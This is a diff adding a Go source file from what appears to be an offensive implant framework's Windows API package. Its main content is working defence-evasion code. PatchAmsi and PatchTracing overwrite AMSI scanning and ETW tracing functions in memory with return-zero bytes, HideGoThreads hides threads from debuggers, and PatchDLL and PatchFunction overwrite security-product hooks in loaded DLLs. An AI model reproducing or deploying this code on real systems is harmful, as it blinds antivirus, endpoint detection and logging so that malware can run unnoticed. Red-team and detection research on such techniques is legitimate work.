@@ -1,0 +1,376 @@
+//go:build windows
+
+// Copyright (C) 2020 - 2022 iDigitalFlame
+//
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with this program.  If not, see <https://www.gnu.org/licenses/>.
+//
+
+package winapi
+
+import (
+	"strings"
+	"syscall"
+	"unsafe"
+
+	"github.com/iDigitalFlame/xmt/util/bugtrack"
+)
+
+// PatchAmsi will attempt to zero out the following function calls with a
+// ASM patch that returns with zero (Primary AMSI/PowerShell calls).
+//
+//  - AmsiInitialize
+//  - AmsiScanBuffer
+//  - AmsiScanString
+//
+// This will return an error if any of the patches fail.
+func PatchAmsi() error {
+	if err := zeroPatch(funcAmsiInitialize); err != nil {
+		return err
+	}
+	if err := zeroPatch(funcAmsiScanBuffer); err != nil {
+		return err
+	}
+	if err := zeroPatch(funcAmsiScanString); err != nil {
+		return err
+	}
+	return nil
+}
+
+// PatchTracing will attempt to zero out the following function calls with a
+// ASM patch that returns with zero:
+//
+//  - NtTraceEvent
+//  - DebugBreak
+//  - DbgBreakPoint
+//  - EtwEventWrite
+//  - EtwEventRegister
+//  - EtwEventWriteFull
+//  - EtwNotificationRegister
+//
+// This will return an error if any of the patches fail.
+func PatchTracing() error {
+	if err := zeroPatch(funcNtTraceEvent); err != nil {
+		return err
+	}
+	if err := zeroPatch(funcDebugBreak); err != nil {
+		return err
+	}
+	if err := zeroPatch(funcDbgBreakPoint); err != nil {
+		return err
+	}
+	if err := zeroPatch(funcEtwEventWrite); err != nil {
+		return err
+	}
+	if err := zeroPatch(funcEtwEventWriteFull); err != nil {
+		return err
+	}
+	if err := zeroPatch(funcEtwEventRegister); err != nil {
+		return err
+	}
+	if err := zeroPatch(funcEtwNotificationRegister); err != nil {
+		return err
+	}
+	return nil
+}
+
+// HideGoThreads is a utility function that can aid in anti-debugging measures.
+// This will set the "ThreadHideFromDebugger" flag on all GOLANG threads only.
+func HideGoThreads() error {
+	return ForEachThread(func(h uintptr) error {
+		// 0x11 - ThreadHideFromDebugger
+		if r, _, _ := syscall.SyscallN(funcNtSetInformationThread.address(), h, 0x11, 0, 0); r > 0 {
+			return formatNtError(r)
+		}
+		return nil
+	})
+}
+func zeroPatch(p *lazyProc) error {
+	if p.find() != nil || p.addr == 0 {
+		// NOTE(dij): Not returning the error here so other function calls
+		//            /might/ succeed.
+		return nil
+	}
+	// 0x40 - PAGE_EXECUTE_READWRITE
+	o, err := NtProtectVirtualMemory(CurrentProcess, p.addr, 5, 0x40)
+	if err != nil {
+		return err
+	}
+	(*(*[1]byte)(unsafe.Pointer(p.addr)))[0] = 0x48     // XOR
+	(*(*[1]byte)(unsafe.Pointer(p.addr + 1)))[0] = 0x33 // RAX
+	(*(*[1]byte)(unsafe.Pointer(p.addr + 2)))[0] = 0xC0 // RAX
+	(*(*[1]byte)(unsafe.Pointer(p.addr + 3)))[0] = 0xC3 // RET
+	(*(*[1]byte)(unsafe.Pointer(p.addr + 4)))[0] = 0xC3 // RET
+	_, err = NtProtectVirtualMemory(CurrentProcess, p.addr, 5, o)
+	syscall.SyscallN(funcNtFlushInstructionCache.address(), CurrentProcess, p.addr, 5)
+	return err
+}
+
+// PatchDLLFile attempts overrite the in-memory contents of the DLL name or file
+// path provided to ensure it has "known-good" values.
+//
+// This function version will read in the DLL data from the local disk and will
+// overwite the entire executable region.
+//
+// DLL base names will be expanded to full paths not if already full path names.
+// (Unless it is a known DLL name).
+func PatchDLLFile(dll string) error {
+	a, b, err := ExtractDLLBase(dll)
+	if err != nil {
+		return err
+	}
+	return PatchDLL(dll, a, b)
+}
+
+// CheckDLLFile attempts to check the in-memory contents of the DLL name or file
+// path provided to ensure it matches "known-good" values.
+//
+// This function version will read in the DLL data from the disk and will verify
+// the entire executable region.
+//
+// DLL base names will be expanded to full paths not if already full path names.
+// (Unless it is a known DLL name).
+//
+// This returns true if the DLL is considered valid/unhooked.
+func CheckDLLFile(dll string) (bool, error) {
+	a, b, err := ExtractDLLBase(dll)
+	if err != nil {
+		return false, err
+	}
+	return CheckDLL(dll, a, b)
+}
+func loadCachedEntry(dll string) (uintptr, error) {
+	if len(dll) == 0 {
+		return 0, ErrInvalidName
+	}
+	b := dll
+	if !isBaseName(dll) {
+		if i := strings.LastIndexByte(dll, '\\'); i > 0 && len(dll) > i {
+			b = dll[i:]
+		}
+	}
+	if len(b) == 0 {
+		return 0, ErrInvalidName
+	}
+	switch {
+	case strings.EqualFold(b, dllNtdll.name):
+		if err := dllNtdll.load(); err != nil {
+			return 0, err
+		}
+		return dllNtdll.addr, nil
+	case strings.EqualFold(b, dllKernelBase.name):
+		if err := dllKernel32.load(); err != nil {
+			return 0, err
+		}
+		return dllKernel32.addr, nil
+	case strings.EqualFold(b, dllKernel32.name):
+		if err := dllKernel32.load(); err != nil {
+			return 0, err
+		}
+		return dllKernel32.addr, nil
+	case strings.EqualFold(b, dllAdvapi32.name):
+		if err := dllAdvapi32.load(); err != nil {
+			return 0, err
+		}
+		return dllAdvapi32.addr, nil
+	case strings.EqualFold(b, dllUser32.name):
+		if err := dllUser32.load(); err != nil {
+			return 0, err
+		}
+		return dllUser32.addr, nil
+	case strings.EqualFold(b, dllDbgHelp.name):
+		if err := dllDbgHelp.load(); err != nil {
+			return 0, err
+		}
+		return dllDbgHelp.addr, nil
+	case strings.EqualFold(b, dllGdi32.name):
+		if err := dllGdi32.load(); err != nil {
+			return 0, err
+		}
+		return dllGdi32.addr, nil
+	case strings.EqualFold(b, dllWinhttp.name):
+		if err := dllWinhttp.load(); err != nil {
+			return 0, err
+		}
+		return dllWinhttp.addr, nil
+	case strings.EqualFold(b, dllWtsapi32.name):
+		if err := dllWtsapi32.load(); err != nil {
+			return 0, err
+		}
+		return dllWtsapi32.addr, nil
+	}
+	return loadLibraryEx(dll)
+}
+
+// PatchFunction attempts to overrite the in-memory contents of the DLL name or
+// file path provided with the supplied function name to ensure it has "known-good"
+// values.
+//
+// This function version will overwite the function base address against the supplied
+// bytes. If the bytes supplied are nil/empty, this function returns an error.
+//
+// DLL base names will be expanded to full paths not if already full path names.
+// (Unless it is a known DLL name).
+func PatchFunction(dll, name string, b []byte) error {
+	if len(b) == 0 {
+		return ErrInsufficientBuffer
+	}
+	h, err := loadCachedEntry(dll)
+	if err != nil {
+		return err
+	}
+	p, err := findProc(h, name, dll)
+	if err != nil {
+		return err
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("winapi.PatchFunction(): Writing supplied %d bytes %X-%X to dll=%s, name=%s.", len(b), p, p+uintptr(len(b)), dll, name)
+	}
+	// 0x40 - PAGE_EXECUTE_READWRITE
+	//        NOTE(dij): Needs to be PAGE_EXECUTE_READWRITE so ntdll.dll doesn't
+	//                   crash during runtime.
+	o, err := NtProtectVirtualMemory(CurrentProcess, p, uint32(len(b)), 0x40)
+	if err != nil {
+		return err
+	}
+	for i := range b {
+		(*(*[1]byte)(unsafe.Pointer(p + uintptr(i))))[0] = b[i]
+	}
+	if _, err = NtProtectVirtualMemory(CurrentProcess, p, uint32(len(b)), o); bugtrack.Enabled {
+		bugtrack.Track("winapi.PatchFunction(): Patching %d bytes %X-%X to dll=%s, name=%s complete, err=%s", len(b), p, p+uintptr(len(b)), dll, name, err)
+	}
+	return err
+}
+
+// PatchDLL attempts to overrite the in-memory contents of the DLL name or file
+// path provided to ensure it has "known-good" values.
+//
+// This function version will overwrite the DLL contents against the supplied bytes
+// and starting address. The 'winapi.ExtractDLLBase' can suppply these values.
+// If the byte array is nil/empty, this function returns an error.
+//
+// DLL base names will be expanded to full paths not if already full path names.
+// (Unless it is a known DLL name).
+func PatchDLL(dll string, addr uint32, b []byte) error {
+	if len(b) == 0 {
+		return ErrInsufficientBuffer
+	}
+
+	h, err := loadCachedEntry(dll)
+	if err != nil {
+		return err
+	}
+	var (
+		n = uint32(len(b))
+		a = h + uintptr(addr)
+	)
+	if bugtrack.Enabled {
+		bugtrack.Track("winapi.PatchDLL(): Writing supplied %d bytes %X-%X to dll=%s", len(b), a, a+uintptr(len(b)), dll)
+	}
+	// 0x40 - PAGE_EXECUTE_READWRITE
+	//        NOTE(dij): Needs to be PAGE_EXECUTE_READWRITE so ntdll.dll doesn't
+	//                   crash during runtime.
+	o, err := NtProtectVirtualMemory(CurrentProcess, a, n, 0x40)
+	if err != nil {
+		return err
+	}
+	for i := range b {
+		(*(*[1]byte)(unsafe.Pointer(a + uintptr(i))))[0] = b[i]
+	}
+	if _, err = NtProtectVirtualMemory(CurrentProcess, a, n, o); bugtrack.Enabled {
+		bugtrack.Track("winapi.PatchDLL(): Patching %d bytes %X-%X to dll=%s complete, err=%s", len(b), a, a+uintptr(len(b)), dll, err)
+	}
+	return err
+}
+
+// CheckFunction attempts to check the in-memory contents of the DLL name or file
+// path provided with the supplied function name to ensure it matches "known-good"
+// values.
+//
+// This function version will check the function base address against the supplied
+// bytes. If the bytes supplied are nil/empty, this will do a simple long JMP/CALL
+// Assembly check instead.
+//
+// DLL base names will be expanded to full paths not if already full path names.
+// (Unless it is a known DLL name).
+//
+// This returns true if the DLL function is considered valid/unhooked.
+func CheckFunction(dll, name string, b []byte) (bool, error) {
+	h, err := loadCachedEntry(dll)
+	if err != nil {
+		return false, err
+	}
+	p, err := findProc(h, name, dll)
+	if err != nil {
+		return false, err
+	}
+	if len(b) > 0 {
+		for i := range b {
+			if (*(*[1]byte)(unsafe.Pointer(p + uintptr(i))))[0] != b[i] {
+				if bugtrack.Enabled {
+					bugtrack.Track("winapi.CheckFunction(): Difference in supplied bytes at %X, dll=%s, name=%s!", p+uintptr(i), dll, name)
+				}
+				return false, nil
+			}
+		}
+		return true, nil
+	}
+	switch (*(*[1]byte)(unsafe.Pointer(p)))[0] {
+	case 0xE9, 0xFF: // JMP
+		if *(*uint32)(unsafe.Pointer(p + 1)) < 16 { // JMP too small to be a hook.
+			return true, nil
+		}
+		if bugtrack.Enabled {
+			bugtrack.Track("winapi.CheckFunction(): Detected an odd JMP instruction at %X, dll=%s, name=%s!", p, dll, name)
+		}
+		return false, nil
+	}
+	if (*(*[1]byte)(unsafe.Pointer(p + 1)))[0] == 0xFF {
+		if bugtrack.Enabled {
+			bugtrack.Track("winapi.CheckFunction(): Detected an odd JMP instruction at %X, dll=%s, name=%s!", p, dll, name)
+		}
+		return false, nil
+	}
+	return true, nil
+}
+
+// CheckDLL attempts to check the in-memory contents of the DLL name or file path
+// provided to ensure it matches "known-good" values.
+//
+// This function version will check the DLL contents against the supplied bytes
+// and starting address. The 'winapi.ExtractDLLBase' can suppply these values.
+// If the byte array is nil/empty, this function returns an error.
+//
+// DLL base names will be expanded to full paths not if already full path names.
+// (Unless it is a known DLL name).
+//
+// This returns true if the DLL is considered valid/unhooked.
+func CheckDLL(dll string, addr uint32, b []byte) (bool, error) {
+	if len(b) == 0 {
+		return false, ErrInsufficientBuffer
+	}
+	h, err := loadCachedEntry(dll)
+	if err != nil {
+		return false, err
+	}
+	a := h + uintptr(addr)
+	for i := range b {
+		if (*(*[1]byte)(unsafe.Pointer(a + uintptr(i))))[0] != b[i] {
+			if bugtrack.Enabled {
+				bugtrack.Track("winapi.CheckDLL(): Difference in supplied bytes at %X, dll=%s!", a+uintptr(i), dll)
+			}
+			return false, nil
+		}
+	}
+	return true, nil
+}
